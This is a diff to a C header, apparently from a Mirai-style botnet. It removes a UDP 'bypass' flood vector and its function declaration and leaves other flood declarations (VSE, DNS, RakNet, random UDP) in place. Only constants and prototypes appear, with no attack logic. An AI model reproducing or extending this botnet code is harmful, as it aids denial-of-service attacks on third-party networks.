@@ -36,7 +36,6 @@ typedef uint8_t ATTACK_VECTOR;
 #define ATK_VEC_GREETH     7  
 #define ATK_VEC_UDP_PLAIN  9  
 #define ATK_VEC_TCP_BYPASS 10 
-#define ATK_VEC_UDP_BYPASS 11 
 #define ATK_VEC_STD        12 
 #define ATK_VEC_LEGIT      13 
 #define ATK_VEC_SOCKET     14 
@@ -90,7 +89,6 @@ void attack_udp_generic(uint8_t, struct attack_target *, uint8_t, struct attack_
 void attack_udp_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_udp_dns(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_udp_plain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
-void attack_udp_bypass(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_udp_rand(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_udp_raknet(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 
